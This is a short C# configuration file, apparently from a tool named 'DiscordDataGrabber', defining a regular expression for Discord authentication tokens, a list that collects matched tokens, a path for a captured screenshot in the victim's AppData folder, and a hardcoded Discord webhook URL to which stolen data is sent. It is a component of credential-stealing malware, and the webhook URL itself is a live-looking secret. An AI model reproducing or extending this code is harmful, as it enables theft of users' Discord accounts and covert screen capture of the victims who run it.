using System;
using System.Collections.Generic;
using System.Security.Policy;
using System.Text.RegularExpressions;

namespace DiscordDataGrabber.Utlities
{
    public static class GlobalVars
    {
        public static string TokenFolder;
        public static Regex TokenPattern = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
        public static MatchCollection FindAToken;
        public static List<string> Token = new List<string>();

        public static Uri WebHookUri =
            new Uri(
                "https://discord.com/api/webhooks/855917808164405298/bE9ewIPrYdJsT_dKR05XNpzkkdxGaWrvAn_XDMcXd1tS8wmDSFvwGVGS6ndg27Pcg5oi");
        public static readonly string ScreenPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\captured.jpg";
    }
}